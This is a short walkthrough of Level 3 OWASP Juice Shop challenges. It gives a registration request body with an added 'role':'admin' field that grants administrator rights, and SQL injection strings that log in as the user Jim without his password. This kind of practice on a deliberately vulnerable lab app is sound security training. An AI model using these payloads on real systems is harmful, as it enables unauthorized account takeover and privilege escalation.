# Level 3

## Admin Registration
_Register as a user with administrator privileges._

Modify the body of the user registration request (`POST /api/Users/`) by adding `"role":"admin",`:
```
{
  "email": "admin@mail",
  "role": "admin",
  "password": "admin1",
  "passwordRepeat": "admin1",
  "securityQuestion": {
    "id": 1,
    "question": "Your eldest siblings middle name?",
    "createdAt": "2020-08-13T14:12:54.775Z",
    "updatedAt": "2020-08-13T14:12:54.775Z"
  },
  "securityAnswer": "Whatever"
}
```

## Login Bender
_Log in with Bender's user account._

Same as [Login Jim](#login-jim) challenge

## Login Jim
_Log in with Jim's user account._

We need two things: email and password

Email is easy. Once you have the admin access, you can see it in _Administration_. It's `jim@juice-sh.op`.

To bypass the password check, we can use a simple SQL injection:
`jim@juice-sh.op';` or `jim@juice-sh.op'--`